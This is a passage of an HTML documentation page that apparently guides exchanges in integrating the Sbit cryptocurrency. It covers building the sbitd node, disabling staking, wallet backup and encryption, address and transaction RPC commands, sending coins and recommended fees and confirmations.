Sbit from our Github Release page</p><p>Simply extract the .tar.gz linux-64bit archive. In the &quot;bin&quot; directory will be the two programs of interest, sbitd and sbit-cli</p><p>If you choose to compile it yourself instead, follow these steps on Ubuntu:</p><p>Install packages if needed:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">install</span><span class="token plain"> build-essential libtool autotools-dev automake pkg-config libssl-dev libevent-dev bsdmainutils </span><span class="token function" style="color:rgb(220, 220, 170)">git</span><span class="token plain"> cmake libboost-all-dev</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">install</span><span class="token plain"> software-properties-common</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">sudo</span><span class="token plain"> add-apt-repository ppa:bitcoin/bitcoin</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">apt-get</span><span class="token plain"> update</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">install</span><span class="token plain"> libdb4.8-dev libdb4.8++-dev</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">git</span><span class="token plain"> clone https://github.com/SBit-Project/sbit --recursive</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">./autogen.sh</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">./configure --with-gui</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">no --enable-hardening</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">make</span><span class="token plain"> -j3</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Afterwards, in the &quot;src&quot; directory, there will be two programs of interest, <code>sbitd</code> and <code>sbit-cli</code></p><h2 class="anchor anchorWithStickyNavbar_mojV" id="startup">Startup<a class="hash-link" href="#startup" title="Direct link to heading">​</a></h2><p>In order to startup sbitd, use the following:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbitd -daemon -staking</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token number" style="color:rgb(181, 206, 168)">0</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Additional options can be specified in <code>~/.sbit/sbit.conf</code>, you can add <code>-staking=0</code> in the sbit.conf file</p><p>Afterwards, you can check the status of the Sbit node:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli getinfo</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It will show a block count. when the block count matches the latest block on our block explorer: <a href="https://explorer.sbit.org" target="_blank" rel="noopener noreferrer">https://explorer.sbit.org</a> then that means that the node is synchronized. If it shows 0 blocks and 0 connections for more than a few minutes, contact Sbit staff for help. Syncing the blockchain will take around 10-30 minutes depending on connection speed</p><p>In order to shut down the node, simply use:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli stop</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="admonition admonition-caution alert alert--warning"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>caution</h5></div><div class="admonition-content"><p><code>-staking=false</code> disables automatic staking in the wallet. This is <strong>HIGHLY RECOMMENDED</strong> for exchanges. Staking can make an unpredictable amount of coins unaccessible for 500 blocks (~20 hours) and so it is recommended that exchanges do not participate in staking.</p></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="wallet-backup">Wallet Backup<a class="hash-link" href="#wallet-backup" title="Direct link to heading">​</a></h2><p>Make sure to always back up your wallet! The location of the wallet file on Linux is <code>~/.sbit/wallet.dat</code>. Make sure to shut down the node before making a backup to avoid data corruption.</p><p>The wallet can also be encrypted on-disk:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli encryptwallet </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;your strong password&quot;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The Sbit node will automatically stop itself in order to encrypt the wallet. You will need to execute <code>./sbitd -daemon -staking=false</code> again afterwards to start the node again</p><div class="admonition admonition-danger alert alert--danger"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>Warning</h5></div><div class="admonition-content"><p><strong>IMPORTANT:</strong> after encrypting the wallet <strong>YOU MUST</strong> make a new backup of the wallet.dat file. Failing to do so can result in <strong>LOSS OF COINS</strong>. If the password to the encrypted wallet is lost, there is <strong>NO WAY TO RECOVER THE COINS</strong>. Make sure to take backups of both wallet.dat, as well as the password used for encryption!</p></div></div><p>In order to unlock the wallet:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli walletpassphrase </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;your strong password&quot;</span><span class="token plain"> XXX</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>XXX is how many seconds to keep the wallet unlocked for. So, specifying that as &quot;1000&quot; would mean keep the wallet unlocked for 1000 seconds.</p><p>For an exchange it is probably best to not use wallet encryption on the hot wallet. In the above example, after 1000 seconds have passed, it is necessary to unlock the wallet again. This may cause some problems depending on your exact exchange systems</p><div class="admonition admonition-note alert alert--secondary"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></div><div class="admonition-content"><p><strong>NOTE:</strong> Unlocking the wallet is only required to send coins. If you only need to receive coins and track transactions, this can be done with an encrypted and locked wallet</p></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="receiving-coins">Receiving coins<a class="hash-link" href="#receiving-coins" title="Direct link to heading">​</a></h2><p>In order to generate a new address:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli getnewaddress </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;&quot;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This will generate a unique address every time it is executed. Note Sbit addresses start with S for standard pubkeyhash addresses, and start with M for multi-sig addresses</p><p>To validate an address is valid:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli validateaddress </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;address here&quot;</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In order to see the coins received by a particular address (note the address must be owned by this wallet. This does not allow checking addresses not owned by this wallet):</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli getreceivedbyaddress </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;address here&quot;</span><span class="token plain"> MINCONF</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In this case, <code>MINCONF</code> is how many confirmations the transaction must have had on the blockchain before it will be included in this number.</p><p>Minimum confirmations recommended by Sbit:</p><ul><li>20 confirmations for very large amounts and for any amount during the first month of the mainnet launch</li><li>10 confirmations for small and medium amounts after 1 month when the network is proven stable</li></ul><p>To get all transactions (including unconfirmed!) currently tracked by the wallet use this function:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli listtransactions </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;*&quot;</span><span class="token plain"> COUNT SKIP</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>COUNT and SKIP can be used for paging through transactions. Using a very large count value may cause the node to perform the request slowly, and so it is recommended to never use a COUNT that is more than 100. SKIP is used to skip the first number of results. It is not recommended to rely only on this for the accounting of an exchange. It is possible that while you are iterating to discover the full transaction list, that someone sends a transaction to the wallet that will be missed. Also, this method includes <strong>UNCONFIRMED</strong> transactions and must be used with caution.</p><div class="admonition admonition-danger alert alert--danger"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>Warning</h5></div><div class="admonition-content"><p><strong>WARNING</strong>: Bitcoind and thus sbitd has some account functionality so that different addresses can use different accounts. <strong>DO NOT RELY ON THIS</strong>. This feature is deprecated and has many security problems, and will be removed in the next release.</p></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="sending-coins">Sending Coins<a class="hash-link" href="#sending-coins" title="Direct link to heading">​</a></h2><p>It is not easily possible to dictate what address coins should be sent from. If your exchange system relies on this, you should make a workaround in your system so that this is not necessary.</p><p>In order to send coins:</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli sendtoaddress </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;address to send to&quot;</span><span class="token plain"> AMOUNT </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;comment about tx&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;comment about address&quot;</span><span class="token plain"> SUBTRACTFEE</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The &quot;comment&quot; arguments can be left blank if unneeded. These comments are saved within your wallet file and are used by some exchanges to track internal withdraw and user IDs.</p><p>The SUBTRACTFEE option can be either &quot;true&quot; or &quot;false&quot;. When this option is true, it subtracts the fee from the amount sent. So, if you do</p><div class="language-bash codeBlockContainer_MPoW theme-code-block" style="--prism-color:#9CDCFE;--prism-background-color:#1E1E1E"><div class="codeBlockContent_B9tL"><pre tabindex="0" class="prism-code language-bash codeBlock__0OG thin-scrollbar"><code class="codeBlockLines_gEuF"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./sbit-cli sendtoaddress </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;address&quot;</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">10</span><span class="token plain"> </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;&quot;</span><span class="token plain"> </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;&quot;</span><span class="token plain"> </span><span class="token boolean">true</span><br></span></code></pre><div class="buttonGroup_hRr1"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And the network fee is 0.1 Sbit, then the actual amount that the user will receive will be 9.9 Sbit. If SUBTRACTFEE is instead set to false, then they will receive 10, but your wallet will have paid 0.1 Sbit for the network fee.</p><div class="admonition admonition-caution alert alert--warning"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>caution</h5></div><div class="admonition-content"><p><strong>NOTE:</strong> Exchange users should not be capable of sending coins directly to a smart contract address (one starting with 0x). These addresses will be rejected by sendtoaddress and proper usage requires significantly more caution to properly use.</p></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="parameters">Parameters<a class="hash-link" href="#parameters" title="Direct link to heading">​</a></h2><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><p>Recommended tx fee: 400000 sat or 0.004 Sbit per kilobyte of tx data (2kb is reasonable transaction size expectation, but it can sometimes be more)</p></div></div><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><p>Recommended confirmations: 20 for the first month, 10 afterwards</p></div></div><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><p>Recommended minimum withdraw amount: 0.01 Sbit</p></div></div><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 